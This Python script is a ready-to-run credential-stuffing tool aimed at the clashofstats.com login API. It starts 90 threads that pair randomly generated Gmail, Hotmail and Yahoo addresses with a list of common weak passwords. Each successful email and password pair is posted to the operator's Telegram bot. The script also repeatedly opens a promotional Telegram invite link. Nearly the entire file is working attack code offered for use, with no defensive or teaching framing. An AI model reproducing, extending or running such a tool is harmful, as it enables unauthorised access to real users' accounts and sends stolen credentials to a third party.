import requests
from user_agent import generate_user_agent as ua
import random
import os
import webbrowser
import time
from threading import Thread
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#اورق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
HH='\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
print(f''' 
{M}
░██╗░░░░░░░██╗██╗███╗░░██╗░██████╗████████╗
░██║░░██╗░░██║██║████╗░██║██╔════╝╚══██╔══╝
░╚██╗████╗██╔╝██║██╔██╗██║╚█████╗░░░░██║░░░
░░████╔═████║░██║██║╚████║░╚═══██╗░░░██║░░░
░░╚██╔╝░╚██╔╝░██║██║░╚███║██████╔╝░░░██║░░░
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░░░░╚═╝░░░
	{X} Tele : {M}@W_22U {F}| {X} Dev : {M}Winston
''')
webbrowser.open('https://t.me/+-RI8FhLv6s82ZGY8')
Token=input(F + ' Enter Token :'+Z)
webbrowser.open('https://t.me/+-RI8FhLv6s82ZGY8')
ID=input(F + ' Enter ID :'+Z)
webbrowser.open('https://t.me/+-RI8FhLv6s82ZGY8')
os.system('clear')
session = requests.Session()
session.get('https://www.clashofstats.com', 
headers={'User-Agent':str(ua())})
def login():
	while True:
		domin=random.choice(['@gmail.com','@hotmail.com','@yahoo.com'])
		email=''.join(random.choice('qwertyuiopasdfghjklzxcvbnm')for i in range(7))+domin
		pas=random.choice(['Aa123456','Aa123123','Aa112233','Aa1234567','Aa12345678','Aa123456789','Aa1234567890','Aa111222333','123456Aa','123123Aa','1234567Aa','12345678','123456789Aa','1234567890Aa','123Aa123','123456','1234567','12345678','123456789','1234567890','123123','112233'])
		headers = {
		    'authority': 'api.clashofstats.com',
		    'accept': 'application/json, text/plain, */*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/json',
		    'origin': 'https://www.clashofstats.com',
		    'referer': 'https://www.clashofstats.com/',
		}
		
		json_data = {
		    'email':email,
		    'password':pas,
		}
		
		response = session.post('https://api.clashofstats.com/login', headers=headers, json=json_data).text
		if '"success":true' in response:
			print(f' {F} God : {email} | {pas}')
			R7 = (f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=  
   𝐆𝐎𝐃
••••••••••••••••••••••••••••••••••••••••
•  - Email : {email}
•  - Pass : {pas}
••••••••••••••••••••••••••••••••••••••••
By : @W_22U
  ''')
			i = requests.post(R7)
			time.sleep(0.6)
		else:
			print(f' {Z} Bad : {email} | {pas}')
		
for i in range(90):
	Thread(target=login).start()
